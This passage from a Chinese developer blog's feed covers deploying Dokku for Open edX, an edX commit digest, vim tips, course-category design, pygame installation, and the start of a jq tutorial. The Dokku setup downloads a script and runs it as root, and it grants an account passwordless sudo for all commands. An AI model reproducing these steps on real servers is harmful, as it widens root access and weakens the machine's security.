&lt;li&gt;&lt;a href="https://github.com/deis/deis"&gt;deis&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/shipyard/shipyard"&gt;shipyard&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/progrium/dokku"&gt;dokku&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;appsembler公司的Open edX云平台使用的好像是&lt;a href="https://github.com/shipyard/shipyard"&gt;shipyard&lt;/a&gt;来管理docker，我最终决定采用&lt;a href="https://github.com/progrium/dokku"&gt;dokku&lt;/a&gt;，原因就不细说了，其中一点是它提供&lt;a href="https://www.heroku.com/"&gt;Heroku&lt;/a&gt;一样的操作方式，而Heroku是极佳的PaaS，许多的现成应用都可以直接部署到其上，十分合适用于构建公司内部的PaaS。用于自动化测试或是其他&lt;/p&gt;
&lt;h1&gt;Dokku是啥&lt;/h1&gt;
&lt;blockquote&gt;
&lt;p&gt;Docker powered mini-Heroku in around 100 lines of Bash&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;Dokku是一个小型的PaaS平台，支持Python、Ruby、Node.js、Java、PHP、Clojure、Go。数据库之类的也都有插件，便利之际&lt;/p&gt;
&lt;p&gt;有了Dokku，我们可以使用简易的方式部署小型应用，将代码git push到对应的仓库就自动触发部署，当然也支持push Dockerfile的方式。我们最后采用的是后一种方式&lt;/p&gt;
&lt;h2&gt;安装&lt;/h2&gt;
&lt;p&gt;在Ubuntu14.04 x64上&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;wget https://raw.githubusercontent.com/progrium/dokku/v0.4.3/bootstrap.sh
sudo &lt;span class="nv"&gt;DOKKU_TAG&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;v0.4.3 bash bootstrap.sh
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;安装结束后。我们还要做以下工作:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;绑定域名（可选），如果不绑定的话，将以自动分配端口的形式访问&lt;/li&gt;
&lt;li&gt;上传受信任机器的ssh-key到dokku服务器上.dokku使用git来完成应用的部署，我们需要将我们的公钥上传到dokku上，使dokku能验证我们的身份。&lt;/li&gt;
&lt;/ul&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="nb"&gt;cd&lt;/span&gt; /home/dokku
mv /home/dokku/VHOST /home/dokku/VHOST~
&lt;span class="nb"&gt;echo&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;localhost&amp;quot;&lt;/span&gt; &amp;gt; /home/dokku/HOSTNAME
sudo visudo &lt;span class="c1"&gt;#在最后写入&lt;/span&gt;
ubuntu  &lt;span class="nv"&gt;ALL&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;NOPASSWD: ALL
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;cat ~/.ssh/id_rsa.pub | ssh ubuntu@server_ip "sudo sshcommand acl-add dokku wwj"&lt;/p&gt;
&lt;h1&gt;构建一般应用&lt;/h1&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;git clone https://github.com/wwj718/helloflask.git
git remote add qcloud_dokku dokku@127.0.0.1:helloflask
git push qcloud_dokku master
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;开始构建
&lt;img alt="dokku1" src="img/edx/dokku/dokku1.png" /&gt;&lt;/p&gt;
&lt;p&gt;正在构建
&lt;img alt="dokku2" src="img/edx/dokku/dokku2.png" /&gt;&lt;/p&gt;
&lt;p&gt;构建完成
&lt;img alt="dokku3" src="img/edx/dokku/dokku3.png" /&gt;&lt;/p&gt;
&lt;h1&gt;构建edx_cypress_docker&lt;/h1&gt;
&lt;p&gt;一键式 &lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;git clone https://github.com/wwj718/edx_cypress_docker.git
git remote add qcloud_dokku dokku@127.0.0.1:edx_cypress_docker
git push qcloud_dokku master
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;&lt;img alt="dokku4" src="img/edx/dokku/dokku4.png" /&gt;&lt;/p&gt;
&lt;p&gt;至此整个拼图已经基本完整了&lt;/p&gt;
&lt;p&gt;Enjoying it&lt;/p&gt;
&lt;h1&gt;补遗&lt;/h1&gt;
&lt;p&gt;&lt;a href="https://github.com/dokku-alt/"&gt;dokku-alt&lt;/a&gt;: dokku 的 fork 版本，它利用覆盖最稳定的使用案例及测试良好的插件来提供完整的解决文案&lt;/p&gt;</description><dc:creator xmlns:dc="http://purl.org/dc/elements/1.1/">wuwenjie</dc:creator><pubDate>Thu, 12 Nov 2015 00:00:00 +0000</pubDate><guid>tag:,2015-11-12:build-paas-for-edx-dev.html</guid><category>edx</category></item><item><title>Open edX每周简报(20151108)</title><link>/Open-edX-weekly-publication.html</link><description>&lt;p&gt;最近将在博客上开一个栏目，定期更新edx的最新动态，至于是一周一更还是两周一更还没定，更新时间大约是周末，这样官方在做的事和计划做的事，能及时被大家获悉&lt;/p&gt;
&lt;p&gt;@MT把广告词都想好了:)&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;修了好久的bug被官方修了；做了好久的功能官方做了。为了避免悲剧，请读每周edX简报&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h1&gt;动机&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;了解官方的开发动态，避免与官方做着同样的事，导致撞车&lt;/li&gt;
&lt;li&gt;跟进新特性进展，提早获悉，帮助决策&lt;/li&gt;
&lt;/ul&gt;
&lt;h1&gt;形态&lt;/h1&gt;
&lt;p&gt;主要是在源码commit级别上跟进，对开发者帮助可能大些，当然也不限于此，一些激动人心的计划和资讯也会一并关注&lt;/p&gt;
&lt;h1&gt;简报内容&lt;/h1&gt;
&lt;p&gt;首先的一件大事是上个月edX第二届会议落幕，其中数据分析是此次的重头戏，更多的资讯，参考&lt;a href="https://open.edx.org/blog/open-edx-con-video-highlights"&gt;Open edX Con Video Highlights&lt;/a&gt;&lt;/p&gt;
&lt;h3&gt;&lt;a href="https://github.com/edx/edx-platform"&gt;edx-platform&lt;/a&gt;&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://github.com/edx/XBlock/pull/323"&gt;Adding message in XBlockSaveError Exception&lt;/a&gt;: 增强xblock的log功能，对调试友好&lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/edx/edx-platform/pull/10277"&gt;Reimplemented text changes for dashboard #10277&lt;/a&gt;:lms面板上更好的信息提示&lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/edx/edx-platform/commit/709758e43371edd163ed87564d92ff6a4bd30b22"&gt;Hide Xblock due dates in studio for self-paced courses.&lt;/a&gt;:之前挺多人关注的自助式课程好像已经实现了？&lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/edx/edx-platform/commit/3a2c0e37dcfbcd5d50383050d86fdf84912e460e"&gt;Remove chat feature &lt;/a&gt;:这个特性之前可能有人关注，斯坦福最早发起的在lms中集成聊天功能，可用于讨论交流，目前正式被移除，大家就不用期待了，需要的话用第三方集成吧&lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/edx/edx-platform/commit/792c3d93c1a938b913b7a7218f7f078cb795587e"&gt;Remove legacy MITX_FEATURES reference&lt;/a&gt;：我记得之前的一些配置文档中，有使用这个特性的，之后肯定会失效，不要惊讶&lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/edx/edx-platform/commit/dc469ea5ecf1b9f415159ae3021b5817d0d7e011"&gt;Fix cert_status None. Add GeneratedCertificate to admin&lt;/a&gt;:哈哈@MT看过来，之后生成证书有admin面板啦，不需要命令行了&lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/edx/edx-platform/commit/1f60e9696ffc05a8b24f2f6fc2b62fd1ecb4100f"&gt;Disabled auto enroll in ccx enrollment tab&lt;/a&gt;：ccx是个值得关注的新特性，用于定制课程属性&lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/edx/edx-platform/commit/2f0e6635812588bb06188fb322a898d0841d4945"&gt;Use ugettext_noop instead of lambdas assigned to the underscore&lt;/a&gt;：这个问题坑了@MT好久，之后应该不会有注册页面学位下拉框汉化的问题了&lt;/li&gt;
&lt;li&gt;&lt;a href="a40d2b65d23d8b44f6b0a592cfbddb2231a1819d"&gt;Course Blocks App MA-1556&lt;/a&gt;:新的django app，提供高层次的接口，获取课程和用户信息&lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/edx/edx-platform/commit/069807644022854072938dd3f789cc54543e074c"&gt;Transformer: StudentViewTransformer&lt;/a&gt;：从中我们可以看到xmodule迁移到xblock的过程，很有学习价值，对学习xblock很有帮助&lt;/li&gt;
&lt;/ul&gt;
&lt;hr /&gt;
&lt;p&gt;本周只关注核心库，之后对edx项目组中以下项目也会予以关注：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://github.com/edx/edx-proctoring"&gt;edx-proctoring&lt;/a&gt;:为考试而打造的子系统&lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/edx/configuration"&gt;configuration&lt;/a&gt;:安装部署相关的库&lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/edx/programs"&gt;programs&lt;/a&gt;:这个新项目似乎是想用来构建学习流程，大体类似大学的培养方案了？&lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/edx/edx-analytics-pipeline"&gt;edx-analytics-pipeline&lt;/a&gt;:数据分析核心库&lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/edx/edx-submissions"&gt;edx-submissions&lt;/a&gt;：提交与得分的api，可用于构建外部题库系统&lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/edx/edx-organizations"&gt;edx-organizations&lt;/a&gt;：平台机构相关&lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/edx/edx-search"&gt;edx-search&lt;/a&gt;：课程搜索&lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/edx/event-tracking"&gt;event-tracking&lt;/a&gt;：学习行为跟踪，数据分析的基础&lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/edx/edx-analytics-data-api"&gt;edx-analytics-data-api&lt;/a&gt;：开放数据接口&lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/edx/xblock-utils"&gt;xblock-utils&lt;/a&gt;：xblock辅助工具&lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/edx/XBlock"&gt;XBlock&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;</description><dc:creator xmlns:dc="http://purl.org/dc/elements/1.1/">wuwenjie</dc:creator><pubDate>Sun, 08 Nov 2015 00:00:00 +0000</pubDate><guid>tag:,2015-11-08:Open-edX-weekly-publication.html</guid><category>edx</category></item><item><title>vim tricks</title><link>/vim-tricks.html</link><description>&lt;p&gt;我是vim重度用户，在这里记录平时自己平时比较喜欢的小技巧&lt;/p&gt;
&lt;p&gt;许多命令看去作用很具体，如果你熟悉vim的一般规则(可以参考《Vim实用技巧》)，将以下例子视为脚手架，可以百般变化&lt;/p&gt;
&lt;p&gt;一个常用的规则是 &lt;code&gt;(number) (command) (text object)&lt;/code&gt;:number是可选的数值参数，command是c/d/y，text object是一个移动命令&lt;/p&gt;
&lt;h3&gt;format&lt;/h3&gt;
&lt;p&gt;&lt;code&gt;gg=G&lt;/code&gt;：&lt;code&gt;gg&lt;/code&gt; to get the start of the file, &lt;code&gt;=&lt;/code&gt; to indent, &lt;code&gt;G&lt;/code&gt; to the end of the file&lt;/p&gt;
&lt;h3&gt;comment/uncomment&lt;/h3&gt;
&lt;p&gt;使用插件:&lt;code&gt;Bundle 'scrooloose/nerdcommenter'&lt;/code&gt; (k-vim已带)&lt;/p&gt;
&lt;p&gt;&lt;code&gt;&amp;lt;leader&amp;gt;c&amp;lt;space&amp;gt;&lt;/code&gt;  加上/解开注释, 智能判断&lt;/p&gt;
&lt;h3&gt;vim and command&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;:!open %&lt;/code&gt;:mac下打开当前文件，&lt;code&gt;%&lt;/code&gt;代表当前文件，open只是command，所以你可以&lt;code&gt;:python %:&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;:read !ls&lt;/code&gt;: read command output（into buffer）&lt;/li&gt;
&lt;li&gt;&lt;code&gt;:write !sh&lt;/code&gt;:类似于管道，把当前文本传入命令中&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;块操作&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;di(&lt;/code&gt;:删除括号里的内容，&lt;code&gt;'vi('&lt;/code&gt;选中括号里的内容，同理就有&lt;code&gt;di'&lt;/code&gt;，&lt;code&gt;vi]&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;移动&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;%&lt;/code&gt;:跳到与之匹配的括号&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;显示&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;:set list&lt;/code&gt;:显示不可见字符 &lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;剪切板&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;reg&lt;/code&gt; : 列出剪切板&lt;/li&gt;
&lt;li&gt;&lt;code&gt;"d3yy&lt;/code&gt; :  将后续3行拖曳到缓冲区d中(&lt;code&gt;"x&lt;/code&gt;表示记号)&lt;/li&gt;
&lt;li&gt;&lt;code&gt;"dp&lt;/code&gt; : 将缓冲区内容放置在光标后&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;mark&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;marks&lt;/code&gt; : show marks&lt;/li&gt;
&lt;li&gt;&lt;code&gt;ma&lt;/code&gt; : 用 &lt;code&gt;a&lt;/code&gt; 标记当前的光标位置&lt;/li&gt;
&lt;li&gt;&lt;code&gt;'a&lt;/code&gt; : 调到a位置&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;replace&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;:1,10s/\n//g&lt;/code&gt;:将1到10行合并为一行&lt;ul&gt;
&lt;li&gt;&lt;code&gt;:1,10s:\n::g&lt;/code&gt;:使用&lt;code&gt;:&lt;/code&gt;来分割&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;code&gt;%s/\/\/.*$//g&lt;/code&gt;: 去掉所有js注释&lt;code&gt;（//）&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;$s/\s//g&lt;/code&gt;:去掉所有的空格&lt;/li&gt;
&lt;li&gt;&lt;code&gt;后向引用&lt;/code&gt;:&lt;ul&gt;
&lt;li&gt;&lt;code&gt;:%s/\(\d\)/[\1]/g&lt;/code&gt;:把数字用&lt;code&gt;[]&lt;/code&gt;包裹起来&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;</description><dc:creator xmlns:dc="http://purl.org/dc/elements/1.1/">wuwenjie</dc:creator><pubDate>Fri, 06 Nov 2015 00:00:00 +0000</pubDate><guid>tag:,2015-11-06:vim-tricks.html</guid><category>dev-tools</category></item><item><title>about Open edX course category</title><link>/about-Open-edX-course-category.html</link><description>&lt;p&gt;之后博客里Open edX相关的文章都用英文标题&lt;/p&gt;
&lt;p&gt;最近收到好些来自国外的邮件，由于Open edX比较新，我们又是Open edX重度用户，平时解决的问题，整个社区可能都用得到。前几天写了《Code Grader in Open edX》,大概是由于题目是英文的缘故，昨晚就收到了3封来自世界各地的邮件，咨询关于&lt;a href="http://wwj718.github.io/Code-Grader-in-Open-edX.html"&gt;Code Grader in Open edX&lt;/a&gt;的细节.其中一个妹子说道&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;I am interested on the topic you have discussed. I know the page is Chinese but thanks to google translate I could understand the page :) &lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;为了方便他们搜索，题目之后都用英文，如果之后英文表达能力有长进，内容也用英文写好了（痛下决心学英语真是 T_T）&lt;/p&gt;
&lt;hr /&gt;
&lt;p&gt;课程分类的问题，我去年有写过一篇文章:&lt;a href="http://wwj718.github.io/extend-edx-course.html"&gt;在edX中为course扩充字段&lt;/a&gt;,虽然目的是拓展edx的course模型，恰好举的例子是为课程添加分类。&lt;/p&gt;
&lt;p&gt;而后同@MT聊天时发现，课程分类竟是个刚需，对于社区版而言。后来课程分类有被添加到&lt;a href="https://github.com/edx/edx-platform/wiki/localization-and-development-in-china"&gt;localization and development in china&lt;/a&gt;，但迟迟没有人给出一个开箱可用的解决方案。&lt;/p&gt;
&lt;p&gt;当时年轻，在&lt;a href="http://wwj718.github.io/extend-edx-course.html"&gt;在edX中为course扩充字段&lt;/a&gt;中采用的方法十分dirty，侵入性很强，相比之下，反而是最初的设计优雅许多（我目前公司内部项目的课程分类，的确也是采用这个方案），我在那篇文章中有提及：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;自己写了个django app加入到lms/djangoapps里。app.models中有course_id字段&lt;/li&gt;
&lt;li&gt;自己写个首页&lt;/li&gt;
&lt;li&gt;在admin里管理首页的内容&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;写出来的效果大概是这样:&lt;/p&gt;
&lt;p&gt;后台管理：
&lt;img alt="course_category1" src="img/edx/edxcn/course_category1.jpg" /&gt;&lt;/p&gt;
&lt;p&gt;添加分类
&lt;img alt="course_category2" src="img/edx/edxcn/course_category2.jpg" /&gt;&lt;/p&gt;
&lt;p&gt;首页呈现
&lt;img alt="course_category3" src="img/edx/edxcn/course_category3.jpg" /&gt;&lt;/p&gt;
&lt;p&gt;这里的核心观念是，把课程视为一种资源，course_id是课程的标识符。&lt;/p&gt;
&lt;hr /&gt;
&lt;p&gt;今天群里就这个问题，又讨论得挺激烈的&lt;/p&gt;
&lt;p&gt;@MT做了精彩的需求描述：&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;课程分类的产品设计： 1 在django admin实现一级二级分类的管理   2 在studio实现对课程归属分类的管理  3 在首页实现对分类的筛选和展示&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;我私下同@MT聊的时候，@MT谈到老师是否可以在studio中决定分类。这的确是一种更加去中心化的方式，属于产品形态的问题，虽然有趣，但我对此不了解，就不方便谈论了。&lt;/p&gt;
&lt;p&gt;技术上这两种方式可以共存，至于最后决定首页如何呈现，这是个产品层面的问题，就留给网站拥有者决定好了&lt;/p&gt;
&lt;h1&gt;思路&lt;/h1&gt;
&lt;p&gt;下面就技术层面谈谈思路&lt;/p&gt;
&lt;p&gt;这是我接触edx不久所做的设计，很粗糙，槽点很多orz. 理念背景需要交代下，我当时把课程视为被资源实体，是内容管理的对象，我把首页视为一个内容管理平台（记得edx开发团队有在google group里说过edx.org也是这样设计的），网站的拥有者决定了课程的归属（分类）&lt;/p&gt;
&lt;p&gt;终于到我比较擅长的技术问题上来啦，主场作战哈哈哈，如果你熟悉django的话，你知道只要写一个model来定义课程类，这个类至少需要以下2个关键属性:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;course_id&lt;/li&gt;
&lt;li&gt;cource_category(外键)&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;之后至于做几级分类，随你的便，因为cource_category仅仅是个外键！&lt;/p&gt;
&lt;p&gt;然后把这个model注册到admin里，就可以在django admin里管理课程啦！&lt;/p&gt;
&lt;p&gt;最后只需要把model传递到首页的模板里，加点调料（css/js），就可以新鲜出炉啦！&lt;/p&gt;
&lt;p&gt;事后我反思这个设计，发现其实可以采用&lt;a href="https://github.com/django-mptt/django-mptt"&gt;django-mptt&lt;/a&gt;,这样分类的层级会更加自由和动态。&lt;/p&gt;
&lt;p&gt;相比具体的实现，我更关注架构上的问题，上面的这种做法采用的是django app的方式，而不是我最初那篇文章提到的侵入式，这样一来，与edx的耦合度很低，完全可以通过一个脚本，以插件的形式自动化插入到edx中，这样就不存在升级的问题。因为我们首页课程分类与edx的关联仅有course_id！&lt;/p&gt;
&lt;p&gt;松耦合，高内聚是我特别喜欢的设计口味&lt;/p&gt;
&lt;p&gt;edx是冲着构建生态去的，就这点而言，具体的实现很可能随时会被替换，更好的实现会层出不穷，为了能随时升级和替换组件，低耦合是多么诱人的特性呀。&lt;/p&gt;
&lt;p&gt;它让我们可以随时甩下历史负担，迎接未来不是么&lt;/p&gt;
&lt;h1&gt;后记&lt;/h1&gt;
&lt;p&gt;我觉得还是有必要理清一下，课程分类和&lt;a href="https://github.com/edx/edx-search"&gt;edx-search&lt;/a&gt;各自的定位问题。我此前一直将课程分类视为网站拥有者的权利，是一种引导用户和呈现资源的方式。尽管它也可以帮助用户找到资源（这两者并不矛盾）&lt;/p&gt;
&lt;p&gt;如果你关心的是如何帮助用户（student），方便用户查找需要的内容，那么&lt;a href="https://github.com/edx/edx-search"&gt;edx-search&lt;/a&gt;可能更适合你。此外@OVER同学之前同我说&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;我想在edx上实现课程推荐这个想法...就是根据用户的兴趣，和学习记录进行一些分析，然后给出推荐&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;也是个很有意思的想法。&lt;/p&gt;
&lt;hr /&gt;
&lt;h1&gt;补充&lt;/h1&gt;
&lt;p&gt;多媒体教育技术研究会的崔老师提到:(崔老师十分热心于社区的工作)&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;课程分类教育部有规定的，有专业-课程-学分的表，就是一个专业由20门课程组成，课程又分abcd类，每个课程根据类别决定课程的课程，a类2个-3个学期，我试想：设定条件下，老师选项，自动生成课程分类表，网页形式显示出。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;我们今后其实可以把国内教育的分类体系预置进去，这个基础性的工作很适合社区来做。目前已经收录到&lt;a href="https://github.com/edx/edx-platform/wiki/localization-and-development-in-china"&gt;localization and development in china&lt;/a&gt;中&lt;/p&gt;
&lt;p&gt;有兴趣的小伙伴一起来吧:)&lt;/p&gt;
&lt;p&gt;康忙北鼻来次GO&lt;/p&gt;</description><dc:creator xmlns:dc="http://purl.org/dc/elements/1.1/">wuwenjie</dc:creator><pubDate>Wed, 04 Nov 2015 00:00:00 +0000</pubDate><guid>tag:,2015-11-04:about-Open-edX-course-category.html</guid><category>edx</category></item><item><title>Install pygame on Mac OSX</title><link>/install-pygame-on-Mac-OSX.html</link><description>&lt;p&gt;Last sunday,when I explored github,I found &lt;a href="https://github.com/justinmeister/Mario-Level-1"&gt;Mario-Level-1&lt;/a&gt; which I enjoyed  very much when i was a kid.&lt;/p&gt;
&lt;p&gt;&lt;a href="https://github.com/justinmeister/Mario-Level-1"&gt;Mario-Level-1&lt;/a&gt; is writen in python（pygame）！ &lt;/p&gt;
&lt;p&gt;I want to hack it ！&lt;/p&gt;
&lt;hr /&gt;
&lt;p&gt;First of all，I need to install &lt;a href="http://pygame.org/hifi.html"&gt;Pygame&lt;/a&gt; on my Mac OSX&lt;/p&gt;
&lt;p&gt;According to some online tutorial，I fail to install it because I could't install smpeg with brew. All  the method  to install smpeg will fail.&lt;/p&gt;
&lt;p&gt;Then I found an easy way to install pygame , just install:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="http://xquartz.macosforge.org/landing/"&gt;XQuartz&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="http://www.pygame.org/ftp/pygame-1.9.2pre-py2.7-macosx10.7.mpkg.zip"&gt;pygame-1.9.2pre-py2.7-macosx10.7.mpkg.zip&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;All started working!&lt;/p&gt;
&lt;p&gt;Enjoying it!&lt;/p&gt;</description><dc:creator xmlns:dc="http://purl.org/dc/elements/1.1/">wuwenjie</dc:creator><pubDate>Wed, 04 Nov 2015 00:00:00 +0000</pubDate><guid>tag:,2015-11-04:install-pygame-on-Mac-OSX.html</guid><category>技术</category></item><item><title>命令行神器之jq</title><link>/command-tool-jq.html</link><description>&lt;p&gt;神器有很多种，有一种是你一旦试用，就无法想象遇到它之前都是怎么过来的&lt;/p&gt;
&lt;p&gt;&lt;a href="https://github.com/stedolan/jq"&gt;jq&lt;/a&gt;属于这种&lt;/p&gt;
&lt;h1&gt;是什么&lt;/h1&gt;
&lt;blockquote&gt;
&lt;p&gt;jq is a lightweight and flexible command-line JSON processor&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;jq是一款命令行工具，专门用来处理json文件，与所有优秀的命令行工具一样，短小精悍，通过管道他们相互协作，组合出惊人的效果&lt;/p&gt;
&lt;p&gt;jq的使用习惯和sed/grep相似&lt;/p&gt;
&lt;h1&gt;安装&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;mac: &lt;code&gt;brew install jq&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;ubuntu: &lt;code&gt;sudo apt-get install jq&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h1&gt;使用&lt;/h1&gt;
&lt;p&gt;&lt;code&gt;cat account.json&lt;/code&gt;&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="p"&gt;{&lt;/span&gt;&lt;span class="nt"&gt;&amp;quot;username&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;wwj&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nt"&gt;&amp;quot;bio&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="kc"&gt;null&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nt"&gt;&amp;quot;requires_parental_consent&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="kc"&gt;true&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nt"&gt;&amp;quot;name&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;wwj&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nt"&gt;&amp;quot;country&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="kc"&gt;null&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nt"&gt;&amp;quot;is_active&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="kc"&gt;true&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nt"&gt;&amp;quot;profile_image&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;&lt;span class="nt"&gt;&amp;quot;image_url_full&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;http://example.com/static/images/default-theme/default-profile_500.de2c6854f1eb.png&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nt"&gt;&amp;quot;image_url_large&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;http://example.com/static/images/default-theme/default-profile_120.33ad4f755071.png&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nt"&gt;&amp;quot;image_url_medium&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;http://example.com/static/images/default-theme/default-profile_50.5fb006f96a15.png&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nt"&gt;&amp;quot;image_url_small&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;http://example.com/static/images/default-theme/default-profile_30.ae6a9ca9b390.png&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nt"&gt;&amp;quot;has_image&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="kc"&gt;false&lt;/span&gt;&lt;span class="p"&gt;},&lt;/span&gt; &lt;span class="nt"&gt;&amp;quot;year_of_birth&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="kc"&gt;null&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nt"&gt;&amp;quot;level_of_education&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="kc"&gt;null&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nt"&gt;&amp;quot;goals&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="kc"&gt;null&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nt"&gt;&amp;quot;language_proficiencies&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="p"&gt;[],&lt;/span&gt; &lt;span class="nt"&gt;&amp;quot;gender&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="kc"&gt;null&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span 